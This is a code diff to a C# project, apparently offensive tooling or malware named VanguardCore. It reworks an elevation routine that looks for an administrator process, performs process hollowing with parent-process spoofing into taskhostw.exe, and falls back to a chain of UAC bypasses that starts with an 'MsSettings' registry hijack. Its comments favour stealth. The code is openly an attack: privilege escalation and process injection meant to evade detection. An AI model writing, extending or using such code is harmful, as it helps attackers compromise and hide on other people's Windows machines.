@@ -176,6 +176,11 @@ namespace VanguardCore
             catch { }
         }
 
+        public static bool IsInjected()
+        {
+            return Environment.CommandLine.Contains("--injected");
+        }
+
         public static bool IsAdmin()
         {
             try
@@ -555,22 +560,36 @@ namespace VanguardCore
 
         public static bool InjectAndBypass(string payloadPath)
         {
-            Log("V3 Elevation: Starting Process Hollowing sequence...");
-            
-            // 1. Discovery
-            int targetPid = FindTargetAdminProcess();
-            string targetPath = "taskhostw.exe"; // Stable target for hollowing
-            
-            // 2. Execute Hollowing (Professional Stealth)
-            if (HollowIntoNewProcess(targetPath))
+            try
             {
-                Log("V3 Hollowing Successful. Exit parent.");
-                Process.GetCurrentProcess().Kill();
-                return true;
-            }
+                Log("V3 Elevation: Starting Process Discovery...");
+                
+                // 1. Discovery
+                int targetPid = FindTargetAdminProcess();
+                if (targetPid == -1)
+                {
+                    Log("V3 Discovery: No suitable admin targets found.");
+                    return false; // Fallback to next method in chain
+                }
 
-            Log("No suitable admin process found for injection. Falling back to chain...");
-            return BypassMsSettingsDelegate(payloadPath, "--v3-fallback");
+                string targetPath = "taskhostw.exe"; 
+                Log($"V3 Injection Target identified: PID {targetPid} ({targetPath})");
+                
+                // 2. Execute Hollowing / Spoofing
+                if (HollowIntoNewProcess(targetPath))
+                {
+                    Log("V3 Injection: Success. Exit parent.");
+                    return true; 
+                }
+
+                Log("V3 Injection: Failed to spawn child with PPID spoof.");
+                return false;
+            }
+            catch (Exception ex)
+            {
+                Log("V3 Injection ex: " + ex.ToString());
+                return false;
+            }
         }
 
         private static bool HollowIntoNewProcess(string targetProcessPath)
@@ -653,8 +672,13 @@ namespace VanguardCore
             // === Order: Most Modern & Stealthy -> Fallback ===
 
             // 0. V3 Hardcore (Process Discovery & Injection/Hollowing)
-            if (InjectAndBypass(payloadPath)) return true;
-            if (IsAdmin()) return true;
+            if (InjectAndBypass(payloadPath)) 
+            {
+                // If InjectAndBypass returned true, it means it successfully SPAWNED a child.
+                // The caller in Program.cs handles killing the parent.
+                return true;
+            }
+            Log("V3 Elevation failed. Falling back to standard chain...");
 
             // 1. MsSettings (Modern Registry Hijack)
             if (BypassMsSettingsDelegate(payloadPath, args)) return true;
